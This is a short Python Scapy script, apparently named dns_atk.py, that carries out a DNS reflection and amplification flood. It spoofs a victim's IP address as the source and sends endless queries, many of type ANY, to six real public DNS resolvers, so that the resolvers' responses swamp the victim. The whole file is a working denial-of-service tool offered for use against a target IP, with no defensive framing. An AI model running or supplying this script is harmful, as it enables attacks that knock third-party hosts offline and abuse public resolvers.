from __future__ import print_function
from scapy.all import *
from random import choice
from sys import argv
from time import sleep

urls = [
	"docs.python.org",
	"lifewire.com",
	"thepacketgeek.com",
	"scapy.readthedocs.io",
	"gist.github.com",
	"medium.com",
	"www.reddit.com",
	"www.facebook.com",
	"www.google.com",
	"www.youtube.com",
	"printing.csie.ntu.edu.tw/app",
	"yahoo.com", "yahoo.tw",
	"msn.com",
	"apple.com", "apple.tw",
	"edition.cnn.com",
	"www.awkwardzombie.com",
	"ntumail.cc.ntu.edu.tw"
	"goalkicker.com/",
	"www.glowscript.org",
	"leagueoflegends.fandom.com",
	"voip.csie.org",
	"zh.wikipedia.org",
	"th.wikipedia.org",
	"web.stanford.edu"
]

def create_packet(victim, server, query, q_type):
	ip = IP(src=victim, dst=server)
	udp = UDP(dport=53)
	dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=query, qtype=q_type))
	request = (ip/udp/dns)
	return request


if __name__ == "__main__":
	if len(argv) != 2:
		print("usage: python dns_atk.py <victim IP>")
		exit(1)
	target = argv[1]
	nameserver = ["208.67.222.222", "149.112.112.112", "185.228.169.9", "23.253.163.53", "176.103.130.131", "176.103.130.130"] # DNS servers
	query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","SRV","TXT", "SOA"]

	print("victim:", target)

	while True:
		for server in nameserver:
			request = create_packet(target, server, choice(urls), choice(query_type))
			send(request, verbose=False)
			print("sent DNS query to DNS server {}".format(server))

	# p = sr1(request)
	# print(p.show())
